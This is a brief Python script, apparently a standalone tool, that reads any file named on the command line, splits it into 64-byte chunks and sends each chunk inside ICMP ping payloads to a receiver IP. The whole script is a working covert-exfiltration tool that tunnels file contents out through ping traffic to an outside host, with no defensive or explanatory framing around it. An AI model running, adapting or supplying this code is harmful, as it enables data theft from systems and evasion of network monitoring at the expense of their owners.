#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
@k4n1n
"""

from pythonping import ping
import argparse

def _arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', help='File to retrieve.', required=True)
    parser.add_argument('-i', '--ip', help='Receiver IP', required=True)
    args = parser.parse_args()
    return args

def _make_ping():
    args = _arguments()
    ip = args.ip
    file = args.file

    with open(file, 'rb') as f:
        # Read the entire file as binary and then split into chunks
        file_content = f.read()
        max_payload_length = 64  # Adjust based on the maximum payload size for ping
        chunks = [file_content[i:i+max_payload_length] for i in range(0, len(file_content), max_payload_length)]

        for chunk in chunks: 
            ping(ip, verbose=True, payload=chunk, size=max_payload_length, count=1)

def main():
    _make_ping()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"An error occurred: {e}")
